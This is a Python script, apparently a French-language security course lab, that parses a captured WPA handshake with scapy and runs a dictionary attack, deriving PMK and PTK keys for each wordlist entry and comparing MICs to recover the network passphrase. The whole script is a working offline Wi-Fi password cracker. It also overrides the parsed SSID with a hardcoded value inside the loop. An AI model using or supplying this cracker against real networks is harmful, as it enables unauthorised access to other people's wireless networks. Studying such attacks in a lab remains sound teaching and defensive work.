from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
from scapy.contrib.wpa_eapol import WPA_key


def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

def findBeacon(capture):
    """
    Cette fonction détecte et retourne le premier Beacon de la capture
    """
    for frame in capture:
        if frame.type == 0 and frame.subtype == 8:
            return frame

def findAuthentication(APmac, capture):
    """
    Cette fonction détecte et retourne le mac du client en sa basant sur les messages d'authentification
    """
    for frame in capture:
        if frame.type == 0 and frame.subtype == 11 and a2b_hex(frame.addr2.replace(':', '')) == APmac :
            return a2b_hex(frame.addr1.replace(':', ''))

def find4wayHandShake(capture):
    """
    Cette fonction détecte et retourne le premier 4 way handshake
    """
    handshake = []
    for frame in capture:
        if len(handshake) >= 4:
            return handshake

        # source AP --> client
        if frame.type == 0x2 and frame.subtype == 0x0:
            handshake.append(frame)

        # source client --> AP
        if frame.type == 0x0 and frame.subtype == 0x0 and frame.proto == 1:
            handshake.append(frame)

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa = rdpcap("wpa_handshake.cap")

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase = "actuelle"
A = "Pairwise key expansion"  # this string is used in the pseudo-random function

# recherche du premier beacon dans la capture
Beacon = findBeacon(wpa)
ssid = Beacon.info.decode("utf-8")
APmac = a2b_hex(Beacon.addr2.replace(':', ''))          # "cebcc8fdcab7"
Clientmac = findAuthentication(APmac, wpa)              # "0013efd015bd"

# detection du handshake et renvoi des 4 trames
handshake = find4wayHandShake(wpa)

# Authenticator and Supplicant Nonces
ANonce = handshake[0].getlayer(WPA_key).nonce                 # 90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91
SNonce = raw(handshake[1])[65:-72]                            # 7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577

# if key_desciptor = 2 we use SHA-1 for the MIC and if key_desciptor = 1 we use MD5 
key_information = raw(handshake[3])[54:55]
mask = 0b00000111
key_descriptor = int.from_bytes(key_information, "big") & mask

print("test : ", key_descriptor) 

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = raw(handshake[3])[-18:-2].hex()                 # "36eef66540fa801ceee2fea9b7929b40"

B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)  # used in pseudo-random function
data = raw(handshake[3])[48:-18] + b"\x00" * 18  # cf "Quelques détails importants" dans la donnée

with open('wordlist.txt','r') as file:
   
    # reading each line    
    for line in file:
        find = False 
        # reading each word        
        for passPhrase in line.split():
   
            # displaying the words           
            # print(passPhrase) 

            #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
            passPhrase = str.encode(passPhrase)
            ssid = str.encode("SWI")
            print(ssid)

            pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

            #expand pmk to obtain PTK
            ptk = customPRF512(pmk,str.encode(A),B)

            #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
            if(key_descriptor == 1): 
                mic = hmac.new(ptk[0:16],data,hashlib.md5) 
            else: 
                mic = hmac.new(ptk[0:16],data,hashlib.sha1)

            print ("MIC:\t\t",mic.hexdigest(),"\n", passPhrase)
            if(mic.hexdigest()[0:32] == mic_to_test):
                print("Success ! The key is : ", passPhrase) 
                find = True 
        if find: 
            break 

